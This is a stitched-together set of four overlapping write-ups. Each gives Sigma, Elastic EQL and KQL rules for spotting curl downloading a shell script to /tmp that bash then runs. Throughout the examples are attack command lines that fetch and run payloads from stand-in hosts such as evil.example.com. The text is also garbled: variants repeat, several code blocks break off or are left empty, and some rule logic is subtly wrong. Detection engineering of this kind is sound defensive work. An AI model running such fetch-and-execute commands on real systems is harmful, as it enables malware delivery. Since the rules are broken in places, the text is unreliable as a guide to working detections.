text:
Below is a practical ordered sequence rule for Linux telemetry. It is written in Elastic Query Language (EQL) because it explicitly enforces “curl download to `/tmp`” followed by “bash execution from `/tmp`”. If your environment uses a different detection language, see the Sigma-style version after the EQL rule.

---

## Rule: Malicious file download and execution via `/tmp` bash script

```text
sequence by host.id, process.parent.pid, process.user.id with maxspan=5m
  [ process where (
      process.name in ("curl", "wget") and
      process.parent.pid exists and
      process.user.id exists and

      // curl/wget writing a shell script to /tmp
      process.command_line:*"/tmp/*" and
      (process.command_line:*".sh" or process.command_line:*".bash") and

      // require output/write intent from curl/wget
      (
        process.command_line:*"-o" or
        process.command_line:*"-O" or
        process.command_line:*"--output" or
        process.command_line:*"--output-dir" or
        process.command_line:*"--output-file"
      )
    )]
  [ process where (
      process.name in ("bash", "sh") and
      process.parent.pid exists and
      process.user.id exists and

      // bash/sh executing a script from /tmp
      process.command_line:*"/tmp/*" and
      (process.command_line:*".sh" or process.command_line:*".bash")
    )]
```

---

## What this detects

This rule correlates two process events:

1. A `curl` or `wget` process writes or downloads something to `/tmp` using output flags such as:
   ```bash
   curl -o /tmp/update.sh http://malicious.example/update.sh
   wget -O /tmp/payload.sh http://malicious.example/payload.sh
   curl --output /tmp/tmp.sh http://malicious.example/mal.sh
   ```

2. A `bash` or `sh` process executes a script from `/tmp`:
   ```bash
   bash /tmp/update.sh
   sh /tmp/payload.sh
   bash -c "source /tmp/tmp.sh"
   ```

The grouping fields:

```text
host.id
process.parent.pid
process.user.id
```

help reduce cross-host and unrelated-session false positives.

---

## Suggested tuning / false positive reduction

If this produces too many false positives, tighten the correlation by using an exact script path field if your telemetry supports it.

For example, if your platform can parse the command line and produce normalized fields such as:

```text
downloaded_script_path
executed_script_path
```

then you can require the exact same script path:

```text
sequence by host.id, downloaded_script_path, executed_script_path, process.user.id with maxspan=5m
  [ process where (process.name in ("curl", "wget") and downloaded_script_path:*"/tmp/*")]
  [ process where (process.name in ("bash", "sh") and executed_script_path:*"/tmp/*")]
```

If your telemetry does not expose those fields, use the first rule and allowlist known benign deployment tooling as needed.

Common legitimate cases to consider tuning for:

```text
get.docker.com
get.helm.sh
k3sup
kubectl
package installers
Ansible bootstrap
systemd generators
```

For example, a benign-looking pattern is:

```bash
curl -sSL https://get.docker.com -o /tmp/install-docker.sh
bash /tmp/install-docker.sh
```

If this is normal in your environment, you can allowlist specific parent processes, users, hosts, or URLs.

---

# Sigma-style portable rule

If you use Sigma, the concept is the same, but ordered correlation depends on your SIEM/EDR/Sigma support. Below is a Sigma-style detection skeleton for Linux process creation events.

```yaml
title: Curl Downloads Bash Script to /tmp Followed by Execution
id: 11111111-1111-1111-1111-111111111111
status: experimental
description: >
  Detects malicious file download and execution behavior where curl or wget downloads
  a shell script to /tmp, followed by bash or sh executing the downloaded script.
  This pattern is commonly associated with malware delivery and download-and-execute techniques.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/
author: Detection Engineering
tags:
  - attack.execution
  - attack.command-and-control
  - attack.t1105
  - attack.t1059.004
logsource:
  product: linux
  category: process_creation
detection:
  condition: selection_download and selection_execute
  correlation:
    type: sequence
    rules:
      - selection_download
      - selection_execute
    group_by:
      - Hostname
      - ParentCommandLine
    maxspan: 5m
    condition:
      count > 1
  selection_download:
    Image|endswith:
      - '/curl'
      - '/wget'
    CommandLine|re:
      - '-o\\s+/tmp/[\\w.\\-]+\\.sh'
      - '-o=/tmp/[\\w.\\-]+\\.sh'
      - '--output\\s+/tmp/[\\w.\\-]+\\.sh'
      - '--output=/tmp/[\\w.\\-]+\\.sh'
      - '-O\\s+/tmp/[\\w.\\-]+\\.sh'
      - '--output-dir\\s+/tmp'
      - '--output-file\\s+/tmp'
  selection_execute:
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|contains|all:
      - '/tmp/'
    CommandLine|contains:
      - '.sh'
      - '.bash'
  filter_benign:
    ParentCommandLine|contains|all:
      - '/usr/bin/git'
      - '/usr/bin/ansible'
      - '/usr/bin/make'
      - '/usr/bin/npm'
      - '/usr/bin/pip'
      - '/usr/bin/docker'
      - '/usr/lib/systemd/'
    condition: selection_download and selection_execute and not filter_benign
fields:
  - CommandLine
  - Image
  - ParentCommandLine
  - Hostname
  - User
falsepositives:
  - Legitimate deployment scripts
  - Package manager or bootstrap installers
  - Developer workflows that download temporary scripts to /tmp
level: high
```

---

## Simpler single-event version

If your platform does not support sequence correlation, you can still detect the common shell one-liner pattern where both download and execution occur inside the same `bash -c` command line.

```yaml
title: Curl Downloads And Executes Bash Script From /tmp In One Command
id: 22222222-2222-2222-2222-222222222222
status: experimental
description: >
  Detects bash or sh commands that use curl or wget to download a shell script
  to /tmp and immediately execute it.
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|re:
      - 'curl.*(-o|--output)(\\s|=)/tmp/[\\w.\\-]+\\.sh.*bash\\s+/tmp/[\\w.\\-]+\\.sh'
      - 'wget.*-O\\s+/tmp/[\\w.\\-]+\\.sh.*bash\\s+/tmp/[\\w.\\-]+\\.sh'
      - 'curl.*(-o|--output)(\\s|=)/tmp/[\\w.\\-]+\\.sh.*sh\\s+/tmp/[\\w.\\-]+\\.sh'
      - 'wget.*-O\\s+/tmp/[\\w.\\-]+\\.sh.*sh\\s+/tmp/[\\w.\\-]+\\.sh'
  condition: selection
fields:
  - CommandLine
  - Image
  - ParentCommandLine
  - Hostname
  - User
falsepositives:
  - Legitimate bootstrap or installer one-liners
level: high
```

Example detected command line:

```bash
bash -c "curl -o /tmp/install.sh http://example.com/install.sh && bash /tmp/install.sh"
```

---

## Recommended production approach

For highest fidelity, use the ordered sequence rule and normalize the script path. For example, enrich events so both of these have a comparable field:

```text
download.script_path = "/tmp/update.sh"
execute.script_path = "/tmp/update.sh"
```

Then require:

```text
host.id, user.id, script_path
```

for correlation.

Without path normalization, the rule detects “curl wrote to `/tmp`” and “bash executed from `/tmp`” within the same parent process/user context. This may have some false positives if multiple legitimate scripts are created and executed in `/tmp`.

Below is a practical temporal detection rule set. Because the objective says **“curl … followed by bash execution,”** this should be implemented as a **correlation/sequence rule**, not just a single event filter.

---

## Recommended Detection Logic

**Condition:**  
Within a short time window, typically **5 minutes** on the same host, detect:

1. A `curl` process downloads or writes a Bash script to `/tmp`, usually using `-o /tmp/…sh`, `--output /tmp/…sh`, or equivalent.
2. A shell process, especially `bash`, executes a script from `/tmp`, e.g. `bash /tmp/…sh` or `/bin/bash /tmp/…sh`.

This maps to common malware behavior: **T1105 Ingress Tool Transfer** and **T1059.004 Command and Scripting Interpreter: Unix Shell**.

## Sigma 1.x Correlation Rule — Linux

> Works where your SIEM supports Sigma 1.1+ correlation rules. If not, use the Elastic EQL version below.

```yaml
title: Curl Downloads Bash Script to /tmp Followed by Bash Execution
id: 6f3e3f3f-2b57-4a3f-9d0d-7d73c1b6f2a1
status: experimental
description: |
  Detects classic Linux download-and-execute behavior where curl downloads
  a Bash script to /tmp, followed by execution of a /tmp script by bash.
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/
logsource:
  product: linux
  category: process_creation
detection:
  curl_download:
    Image|endswith:
      - '/curl'
    CommandLine|re: '(?:-o|--output)\s*=?\s*/tmp/[^\s]+\.(sh|bash)'

  bash_execution:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
    CommandLine|re: '/tmp/[^\s]+\.(sh|bash)'

  condition: curl_download or bash_execution

correlation:
  type: temporal
  rules:
    - curl_download
    - bash_execution
  timespan: 5m
  groupfield_by:
    - host.name
    # Optional: if your EDR normalizes the executed script path to file.path,
    # add file.path here to correlate the exact same downloaded script.
```

### Tuning notes

- `Image` may need to be adjusted depending on your EDR schema, e.g. `Process.Path`, `process_executable`, `image_path`.
- `CommandLine` may be called `process_command_line`, `command_line`, `args`, or `cmd`.
- To reduce false positives, require:
  - Non-interactive or suspicious parent processes.
  - Files written to `/tmp` or `/var/tmp`.
  - Execution shortly after download.
  - No valid code signature, if available.
  - Exclude known administrative scripts, CI/CD jobs, monitoring agents, and installer paths.

## Elastic EQL Sequence Rule

> Use this if your environment is Elastic Security / EQL-capable. This explicitly models “followed by.”

```eql
sequence by host.name with maxspan=5m
  [process where event.action == "process_start"
    and (
      process.name == "curl"
      or process.name == "curl.exe"
    )
    and (
      process.command_line contains " -o /tmp/"
      or process.command_line contains " -o=/tmp/"
      or process.command_line contains " --output /tmp/"
      or process.command_line contains " --output=/tmp/"
    )
    and (
      process.command_line contains ".sh"
      or process.command_line contains ".bash"
    )
  ]
  [process where event.action == "process_start"
    and (
      process.name == "bash"
      or process.name == "sh"
      or process.name == "dash"
      or process.name == "zsh"
    )
    and process.command_line contains "/tmp/"
    and (
      process.command_line contains ".sh"
      or process.command_line contains ".bash"
    )
  ]
```

### More precise EQL version

If your EDR exposes `file.path` or `file.name` on both file-creation and process-execution events, you can correlate the exact same script instead of any `/tmp/*.sh` on the host.

```eql
sequence by host.name with maxspan=5m
  [file_event where event.action == "file_create"
    and process.name == "curl"
    and file.path startswith "/tmp/"
    and (
      file.path endswith ".sh"
      or file.path endswith ".bash"
    )
  ]
  [process_event where event.action == "process_start"
    and (
      process.name == "bash"
      or process.name == "sh"
      or process.name == "dash"
      or process.name == "zsh"
    )
    and file.path startswith "/tmp/"
    and (
      file.path endswith ".sh"
      or file.path endswith ".bash"
    )
  ]
```

text:
Below is a practical detection rule set for **Linux endpoints** to detect the classic malicious pattern:

> `curl` downloads a bash/shell script into `/tmp`, and then `bash` executes that script.

The strongest implementation is a **two-step temporal correlation rule** because these may occur as two separate process-create events. A single-event rule can also be added for chained shell commands.

---

## 1. SIEM-agnostic detection logic

Generate an alert when, on the same host, the following occur close together:

1. A `curl` process downloads a `.sh` file into `/tmp`.
2. A `bash`, `sh`, or compatible shell process executes a `.sh` file from `/tmp`.

Suggested time window: **30 seconds**, tunable based on environment.

Example malicious command sequence:

```bash
curl -o /tmp/update.sh https://evil.example.com/update.sh
bash /tmp/update.sh
```

Or:

```bash
curl --output=/tmp/x.sh https://evil.example.com/x.sh && /bin/bash /tmp/x.sh
```

---

## 2. Sigma rule: `curl` downloads shell script to `/tmp`

This rule detects stage 1: `curl` writing a `.sh` file into `/tmp`.

```yaml
title: Curl Downloads Bash Script To /tmp
id: 2f8d3694-8594-4f9a-91f0-b22f9f5f1d23
status: experimental
description: >
  Detects the curl binary being used to download a shell script into /tmp.
  This is commonly seen as stage one of malicious download-and-execute malware delivery.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
author: Detection Engineering
date: 2026-06-14
tags:
  - attack.command_and_control
  - attack.execution
  - attack.t1105
  - attack.t1059.004
logsource:
  product: linux
  category: process_creation
  service: sysmon
detection:
  selection_curl_process:
    Image|endswith:
      - '/curl'

  selection_download_url:
    CommandLine|contains:
      - 'http://'
      - 'https://'
      - 'ftp://'

  selection_write_to_tmp_script:
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  selection_output_flags:
    CommandLine|contains:
      - '-o '
      - '--output='
      - '--output-dir='
      - '-O '

  selection_cwd_is_tmp:
    CWD|startswith: '/tmp/'

  selection_cwd_output_flags:
    CommandLine|contains:
      - '-O '
      - '--output-dir='
      - '.sh'

  filter_internal_paths:
    CommandLine|contains:
      - '/tmp/systemd-'
      - '/tmp/.X11-'
      - '/tmp/snap-private-tmp/'

  condition: >
    selection_curl_process and
    selection_download_url and
    (
      (
        selection_write_to_tmp_script and
        selection_output_flags
      ) or
      (
        selection_cwd_is_tmp and
        selection_cwd_output_flags
      )
    ) and
    not filter_internal_paths
falsepositives:
  - Legitimate software installers
  - CI/CD pipeline deployment steps
  - Patch-management agents
  - Ansible, Puppet, Chef, Salt, or configuration-management scripts
level: medium
```

---

## 3. Sigma rule: `bash` executes shell script from `/tmp`

This rule detects stage 2: execution of a script located under `/tmp`.

```yaml
title: Bash Executes Shell Script From /tmp
id: 3b93a7d1-92c7-4f5f-8f2d-6a3d1f8c1c22
status: experimental
description: >
  Detects bash or POSIX shell execution of shell scripts located in /tmp.
  When correlated with curl downloads to /tmp, this indicates a classic
  malicious download-and-execute delivery pattern.
references:
  - https://attack.mitre.org/techniques/T1059/004/
author: Detection Engineering
date: 2026-06-14
tags:
  - attack.execution
  - attack.t1059.004
logsource:
  product: linux
  category: process_creation
  service: sysmon
detection:
  selection_shell:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'

  selection_script_in_tmp:
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  filter_known_deployment_paths:
    ParentImage|endswith:
      - '/snap/snapd/current/usr/lib/snapd/snapd'
      - '/usr/bin/apt'
      - '/usr/bin/dpkg'
      - '/usr/bin/apt-get'

  filter_known_deployment_commands:
    ParentCommandLine|contains:
      - 'apt-get install'
      - 'apt install'
      - 'dpkg -i'
      - 'snapd'

  condition: selection_shell and selection_script_in_tmp and not filter_known_deployment_paths and not filter_known_deployment_commands
falsepositives:
  - Temporary maintenance scripts
  - Installer payloads
  - Application deployment scripts
  - Container entrypoints using /tmp scripts
level: medium
```

---

## 4. Correlation rule: `curl` downloads `.sh` to `/tmp`, then `bash` executes it

Use this rule to combine the two stage detections. This is the recommended rule for the requested malicious behavior.

```yaml
title: Curl Downloads Bash Script To /tmp Followed By Bash Execution
id: 53a7d93e-92c9-4f4c-8e8d-4e69f2f63955
status: experimental
description: >
  Temporal correlation rule that detects when curl downloads a shell script into /tmp
  and bash/sh subsequently executes a shell script from /tmp. This behavior is strongly
  associated with malware download-and-execute delivery.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
author: Detection Engineering
date: 2026-06-14
tags:
  - attack.command_and_control
  - attack.execution
  - attack.t1105
  - attack.t1059.004
logsource:
  product: linux
  category: process_creation
  service: sysmon
correlation:
  type: temporal
  rules:
    - 2f8d3694-8594-4f9a-91f0-b22f9f5f1d23
    - 3b93a7d1-92c7-4f5f-8f2d-6a3d1f8c1c22
  timeframe: 30s
  groupby:
    - Host
  condition:
    rule2:
      rule1: true
  aliases:
    Host: Host
detection:
  selection:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'
  condition: selection
falsepositives:
  - Legitimate curl-to-/tmp installers
  - DevOps scripts
  - CI/CD jobs
level: high
```

> Note: Some SIEM tools require correlation rules to be implemented as separate detection rules plus a correlation sequence. If your tool does not support Sigma correlation syntax directly, use the two component rules above and implement the temporal join in your SIEM.

---

## 5. Single-event fallback rule for chained commands

Many attackers execute the behavior in one chained command, for example:

```bash
sh -c "curl -o /tmp/update.sh https://evil.example.com/update.sh && bash /tmp/update.sh"
```

This rule catches common command-line patterns in a single event.

```yaml
title: Chained curl Download To /tmp and Bash Execution
id: 1e39f7c1-5f44-4b2d-9c7a-92d1d8f5b8f0
status: experimental
description: >
  Detects a shell process whose command line contains both curl downloading a
  script into /tmp and bash execution of that script, typical of download-and-execute malware delivery.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
author: Detection Engineering
date: 2026-06-14
tags:
  - attack.command_and_control
  - attack.execution
  - attack.t1105
  - attack.t1059.004
logsource:
  product: linux
  category: process_creation
  service: sysmon
detection:
  selection_shell:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
      - '/ksh'

  selection_curl_download:
    CommandLine|contains|all:
      - 'curl'
      - '/tmp/'
      - '.sh'

  selection_execution:
    CommandLine|contains:
      - '&& bash /tmp/'
      - '| bash /tmp/'
      - '&& /bin/bash /tmp/'
      - '&& sh /tmp/'
      - '| sh /tmp/'
      - '-c bash /tmp/'
      - 'bash /tmp/'
      - '/tmp/'

  filter_url_present:
    CommandLine|contains:
      - 'http://'
      - 'https://'
      - 'ftp://'

  condition: selection_shell and selection_curl_download and selection_execution and filter_url_present
falsepositives:
  - Legitimate installer scripts
  - Temporary deployment automation
level: high
```

---

## 6. Example KQL query for Microsoft Defender for Endpoint / Kusto-style SIEM

If your environment stores Linux process events in tables such as `DeviceProcessEvents`, the correlation can be written as:

```kql
DeviceProcessEvents
| where Timestamp > ago(1h)
| where FolderPath == "/usr/bin/curl"
   or FolderPath == "/bin/curl"
   or FolderPath == "/usr/local/bin/curl"
| where ProcessCommandLine has ".sh"
  and ProcessCommandLine has "/tmp/"
  and ProcessCommandLine has "http"
| project Timestamp,
          DeviceId,
          DeviceName,
          AccountName,
          FileName,
          ProcessCommandLine
| join kind=inner (
    DeviceProcessEvents
    | where Timestamp > ago(1h)
    | where FileName in ("bash", "sh", "dash", "zsh")
    | where ProcessCommandLine has "/tmp/"
      and ProcessCommandLine has ".sh"
    | project Timestamp2 = Timestamp,
              DeviceId2 = DeviceId,
              DeviceName2 = DeviceName,
              FileName2 = FileName,
              ProcessCommandLine2 = ProcessCommandLine
  )
  on DeviceId
| where Timestamp2 between (Timestamp .. (Timestamp + 30s))
| project-reorder Timestamp,
                  Timestamp2,
                  DeviceId,
                  DeviceName,
                  FileName,
                  ProcessCommandLine,
                  FileName2,
                  ProcessCommandLine2
```

---

## 7. Example Elastic KQL query concept

For Elastic Security, if process events include `process.executable` and `process.command_line`, the stage logic is:

```kql
process.executable:*curl
and process.command_line:("-o /tmp/*.sh" or "--output=/tmp/*.sh" or "-O *")
and process.command_line:(".sh" and "/tmp/" and "http*")
```

For execution:

```kql
process.executable:(*/bash or */sh or */dash or */zsh)
and process.command_line:("/tmp/*.sh")
```

Correlate by:

```text
host.id / host.name / event.host
within 30 seconds
```

---

## 8. Recommended tuning guidance

To reduce noise without losing the primary detection:

### Lower false positives by requiring:

- Script filename is not obviously benign:
  - `/tmp/install.sh` may be common.
  - Random names such as `/tmp/a8f2s0d.sh` are higher confidence.
- Execution user is non-service or unusual.
- Network destination is not allowlisted.
- Parent process is `sh -c`, `bash -c`, reverse shell, crontab, or suspicious remote access tool.

### Higher-confidence correlation:

Alert with `high` severity when:

```text
curl downloads /tmp/*.sh
+
bash/sh executes /tmp/*.sh
+
script name is random-looking or unsigned
+
network destination is untrusted
```

### Allowlist cautiously:

Typical false positives include:

```bash
curl -o /tmp/update.sh https://trusted.vendor.com/update.sh
bash /tmp/update.sh
```

Prefer allowlisting by parent process, trusted binary path, or known installer, rather than globally ignoring `/tmp/*.sh`.

text:
Below is a high-fidelity detection rule for **Linux** environments that alerts when:

1. `curl` downloads/creates a Bash script under `/tmp`, and  
2. `bash` subsequently executes a script under `/tmp`.

This pattern commonly matches malware delivery such as:

```bash
curl http://evil.example/payload.sh -o /tmp/payload.sh && bash /tmp/payload.sh
```

Because this is a multi-step behavior, the preferred implementation is a **sequence/correlation rule**, not just a single process-creation match.

---

## Option 1 — Portable Sigma rule

> This Sigma rule is written as a correlation-style rule. If your SIEM/backend does not support sequence/correlation rules, translate the same logic into native EQL, KQL, SPL, or SQL correlation logic.

```yaml
title: Malicious Download-and-Execute via curl to Bash in /tmp
id: 9722d58c-7d4e-4f1c-a836-39b8b1e0f7c2
status: experimental
description: |
  Detects when curl downloads or creates a Bash script in /tmp and bash later executes
  a Bash script from /tmp. This behavior is commonly associated with malware delivery,
  persistence, or command-and-control staged execution.
author: security-team
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/
logsource:
  category: process_creation
  product: linux

detection:
  curl_o:
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - '://'
      - '-o /tmp/'
      - '.sh'

  curl_o_nospace:
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - '://'
      - '-o/tmp/'
      - '.sh'

  curl_output_eq:
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - '://'
      - '--output=/tmp/'
      - '.sh'

  curl_output_space:
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - '://'
      - '--output /tmp/'
      - '.sh'

  curl_output_dir:
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - '://'
      - '--output-dir /tmp'
      - '.sh'

  curl_redirect:
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - '://'
      - '> /tmp/'
      - '.sh'

  curl_redirect_append:
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - '://'
      - '>> /tmp/'
      - '.sh'

  bash_exec:
    Image|endswith:
      - '/bash'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  condition: (
      curl_o or
      curl_o_nospace or
      curl_output_eq or
      curl_output_space or
      curl_output_dir or
      curl_redirect or
      curl_redirect_append
    ) -> bash_exec

timespan: 5m
group_by:
  - HostName
  - User

fields:
  - HostName
  - User
  - Image
  - CommandLine
  - ParentImage
  - ParentCommandLine

falsepositives:
  - Legitimate bootstrap scripts that download helper scripts into /tmp.
  - Patching, deployment, CI/CD, container, or Kubernetes initialization workflows.
  - Administrator or automation tooling that downloads and executes maintenance scripts.

level: medium

tags:
  - attack.execution
  - attack.command-and-control
  - attack.t1105
  - attack.t1059.004
```

---

## Option 2 — Elastic EQL sequence rule

This is closer to what many EDR platforms can implement natively. Adjust field names to match your environment, for example `process.name`, `process.executable`, `process.command_line`, `event.type`, `host.name`, and `user.name`.

```eql
sequence maxspan=5m
  by host.name, user.name

  [process where event.type == "start" and
    (
      process.name in ("curl", "/usr/bin/curl", "/bin/curl", "/usr/local/bin/curl")
      or process.executable in ("/usr/bin/curl", "/bin/curl", "/usr/local/bin/curl")
    ) and
    process.command_line ==* "://" and
    (
      process.command_line ==* "-o /tmp/" or
      process.command_line ==* "-o/tmp/" or
      process.command_line ==* "--output=/tmp/" or
      process.command_line ==* "--output /tmp/" or
      process.command_line ==* "--output-dir /tmp" or
      process.command_line ==* "> /tmp/" or
      process.command_line ==* ">> /tmp/"
    ) and
    (
      process.command_line ==* ".sh"
    )
  ]

  [process where event.type == "start" and
    (
      process.name in ("bash", "/usr/bin/bash", "/bin/bash", "/usr/local/bin/bash")
      or process.executable in ("/usr/bin/bash", "/bin/bash", "/usr/local/bin/bash")
    ) and
    process.command_line ==* "/tmp/" and
    (
      process.command_line ==* ".sh"
    )
  ]
```

---

## Optional: add a file-write step for better fidelity

If your platform exposes file-write events, strengthen the rule by requiring that the script actually appears in `/tmp` before bash executes it:

```eql
sequence maxspan=5m
  by host.name, user.name

  [process where event.type == "start" and
    process.name == "curl" and
    process.command_line ==* "://" and
    process.command_line ==* "/tmp/" and
    (
      process.command_line ==* "-o /tmp/" or
      process.command_line ==* "--output-dir /tmp" or
      process.command_line ==* "--output=/tmp/" or
      process.command_line ==* "> /tmp/"
    ) and
    process.command_line ==* ".sh"
  ]

  [file where event.type == "modification" and
    process.name == "curl" and

- **Time window:** Start with `5 minutes`. Use `1-3 minutes` in very busy environments to reduce noise, or expand to `10-30 minutes` if staged execution is delayed.

  ```bash
  curl http(s)://... -o /tmp/x.sh
  chmod +x /tmp/x.sh
  bash /tmp/x.sh
  ```

- **Related but different pattern:** `curl http(s)://... | bash` can be detected with a separate rule because it may not write the script to `/tmp`.

text:
Below is a portable Sigma detection rule set for Linux telemetry. It detects the download-and-execute pattern:

1. `curl` writes a file to `/tmp`
2. `bash` later executes a file from `/tmp`
3. correlated by host/user within a short time window

Because this is a two-event pattern, the recommended detection is a **Sigma `temporal_ordered` correlation rule** with two component rules.

---

## Assumptions

- Telemetry source: Linux process creation events
- Typical fields used:
  - `Image` → executable path, e.g. `/usr/bin/curl`, `/bin/bash`
  - `CommandLine` → full command line
  - `Hostname`, `User` → correlation keys
- If using Sysmon for Linux, process creation is usually `EventID 1`

---

## Sigma Rule 1: `curl` Downloads File to `/tmp`

```yaml
---
title: curl Downloads File to /tmp
id: 6f7a8d8c-3c23-5d6e-9b11-1a2d3e4f5a6b
status: experimental
description: |
  Detects curl writing a file under /tmp using -o/--output/--output-dir.
  This rule is intended to be used as the first event in a temporal correlation
  with bash execution from /tmp.
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith: '/curl'
  output_to_tmp:
    CommandLine|contains:
      - '-o /tmp/'
      - '-o=/tmp/'
      - '--output /tmp/'
      - '--output=/tmp/'
      - '--output-dir /tmp/'
      - '--output-dir=/tmp/'
  output_to_tmp_regex:
    CommandLine|regex: '(?i)(?:-o|--output|--output-dir)(?:=|\s)?/tmp/[^\s]+'
  condition: selection and (output_to_tmp or output_to_tmp_regex)
falsepositives:
  - Legitimate software installers or deployment scripts that use curl and /tmp
level: low
tags:
  - attack.execution
  - attack.command_and_control
  - attack.t1059.004
  - attack.t1105
```

---

## Sigma Rule 2: `bash` Executes File from `/tmp`

```yaml
---
title: bash Executes File from /tmp
id: 2b1c7d5e-9815-4c7d-8d16-4f8b6e3a1c2d
status: experimental
description: |
  Detects bash being executed with a file path under /tmp.
  This rule is intended to be used as the second event in a temporal correlation
  with curl downloads to /tmp.
references:
  - https://attack.mitre.org/techniques/T1059/004/
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith: '/bash'
  tmp_execution_regex:
    CommandLine|regex: '(?i)\bbash\s+(?:-[a-zA-Z]+\s+)*"?/tmp/[^\s"]+'
  tmp_execution_contains:
    CommandLine|contains|all:
      - 'bash'
      - '/tmp/'
  condition: selection and (tmp_execution_regex or tmp_execution_contains)
falsepositives:
  - Interactive administrator sessions running scripts in /tmp
  - Legitimate deployment or installation scripts
level: low
tags:
  - attack.execution
  - attack.t1059.004
```

---

## Primary Detection: Sigma Temporal Correlation Rule

```yaml
---
title: Malicious File Download and Execution via curl /tmp Followed by bash
id: d9a3c61f-0b3d-4d0b-9f33-7f2c893f45f1
status: experimental
description: |
  Detects a host/user performing a curl download that writes a file under /tmp,
  followed within 15 minutes by bash execution of a file under /tmp.
  This is consistent with classic download-and-execute malware delivery behavior.
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/
logsource:
  product: linux
  category: process_creation
correlation:
  type: temporal_ordered
  rules:
    - 6f7a8d8c-3c23-5d6e-9b11-1a2d3e4f5a6b
    - 2b1c7d5e-9815-4c7d-8d16-4f8b6e3a1c2d
  groupby:
    - Hostname
    - User
  timeframe: 15m
  condition: all of them*
  generate_new_event: true
level: high
tags:
  - attack.execution
  - attack.command_and_control
  - attack.t1059.004
  - attack.t1105
```

> **Note:** Some Sigma implementations require rule IDs or rule names in `condition`. If `all of them*` is not supported, replace it with explicit IDs, for example:
>
> ```yaml
> condition: 6f7a8d8c-3c23-5d6e-9b11-1a2d3e4f5a6b and 2b1c7d5e-9815-4c7d-8d16-4f8b6e3a1c2d
> ```

---

## Fallback Detection Without Event Correlation

If your platform cannot correlate two separate process events, use this lower-confidence single-event rule. It captures common cases such as:

- `bash /tmp/script.sh` where the parent process is `curl`
- `bash -c "curl -o /tmp/script.sh ... && bash /tmp/script.sh"`
- One-liner shell commands containing `curl`, `/tmp/`, and `bash`

```yaml
---
title: bash Executes /tmp Script with curl Context
id: b97d918a-1b6e-4c19-8f3e-4d5c8f5f55d3
status: experimental
description: |
  Detects bash execution from /tmp when the parent process or command line context
  includes curl. This is a fallback rule for environments that cannot perform
  temporal event correlation.
logsource:
  product: linux
  category: process_creation
detection:
  parent_curl:
    Image|endswith: '/bash'
    ParentImage|endswith: '/curl'
    CommandLine|contains: '/tmp/'
  parent_cmdline_curl_tmp_bash:
    Image|endswith: '/bash'
    ParentCommandLine|contains|all:
      - 'curl'
      - '/tmp/'
      - 'bash'
  current_cmdline_curl_tmp_bash:
    Image|endswith: '/bash'
    CommandLine|contains|all:
      - 'curl'
      - '/tmp/'
      - 'bash'
  condition: parent_curl or parent_cmdline_curl_tmp_bash or current_cmdline_curl_tmp_bash
falsepositives:
  - Trusted deployment scripts
  - CI/CD runners
  - Admin-performed installation commands
level: medium
tags:
  - attack.execution
  - attack.command_and_control
  - attack.t1059.004
  - attack.t1105
```

> If `ParentCommandLine` is not available in your telemetry source, remove `parent_cmdline_curl_tmp_bash`.

---

## Recommended Tuning and Improvements

### 1. Reduce false positives by requiring `.sh` or `.bash`

If you want stricter matching for bash scripts, change the detection logic to require a script extension.

For the `curl` download rule, replace:

```yaml
output_to_tmp_regex:
  CommandLine|regex: '(?i)(?:-o|--output|--output-dir)(?:=|\s)?/tmp/[^\s]+'
```

with:

```yaml
output_to_tmp_regex:
  CommandLine|regex: '(?i)(?:-o|--output|--output-dir)(?:=|\s)?/tmp/[^\s]+\.(?:sh|bash)\b'
```

For the `bash` execution rule, replace:

```yaml
tmp_execution_regex:
  CommandLine|regex: '(?i)\bbash\s+(?:-[a-zA-Z]+\s+)*"?/tmp/[^\s"]+'
```

with:

```yaml
tmp_execution_regex:
  CommandLine|regex: '(?i)\bbash\s+(?:-[a-zA-Z]+\s+)*"?/tmp/[^\s"]+\.(?:sh|bash)\b'
```

This reduces detection of unrelated scripts but may miss files without extensions.

---

### 2. Correlate on the exact `/tmp` file path if possible

The broadest correlation uses only `Hostname` and `User`. If your SIEM supports field extraction, group by the `/tmp` file path as well to reduce false positives.

Example extraction logic:

```text
From curl download command:
  (?i)(?:-o|--output|--output-dir)(?:=|\s)?"/?tmp/([^\s"]+)

From bash execution command:
  (?i)\bbash\s+(?:-[a-zA-Z]+\s+)*"?/tmp/([^\s"]+)
```

Then add:

```yaml
groupby:
  - Hostname

### 3. Account for alternate temporary directories

Linux malware sometimes uses:

- `/var/tmp/`
- `/tmp/`
- `/dev/shm/`
- `/tmp/.X11-unix/`
- `/private/tmp/` on macOS

```yaml

```text

### 4. Consider additional shells

The same pattern can appear with:

```text
sh
dash
